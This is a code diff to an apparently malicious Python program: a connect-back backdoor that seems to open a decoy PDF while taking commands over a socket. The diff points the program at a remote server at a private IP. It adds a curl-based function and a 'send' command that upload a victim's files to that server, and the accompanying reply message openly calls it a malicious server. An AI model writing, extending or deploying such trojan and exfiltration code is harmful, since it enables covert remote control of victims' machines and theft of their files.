@@ -5,7 +5,17 @@ import shlex
 import threading
 import sys
 import webbrowser
-SERVER_URL = "http://127.0.0.1:2020"
+SERVER_URL = "http://192.168.88.105:2020"
+def send_files(args):
+    files = args[1:]
+    if not files:
+        print("No files provided to upload.")
+        return
+    curl_command = ["curl"]
+    for file in files:
+        curl_command.extend(["-F", f"files=@{file}"])
+    curl_command.append(f"{SERVER_URL}/upload")
+    subprocess.run(curl_command, capture_output=True, text=True)
 def open_pdf():
     print("Open pdf in webborwser....")
     if hasattr(sys, "_MEIPASS"):
@@ -21,6 +31,10 @@ def connect_back():
         try:
             cmd = s.recv(1024).decode("utf-8").strip()
             if not cmd:
+                continue
+            if cmd.startswith("send"):
+                send_files(cmd)
+                s.send("Files has been sent to your mailicous server")
                 continue
             if cmd.lower() == "exit":
                 break
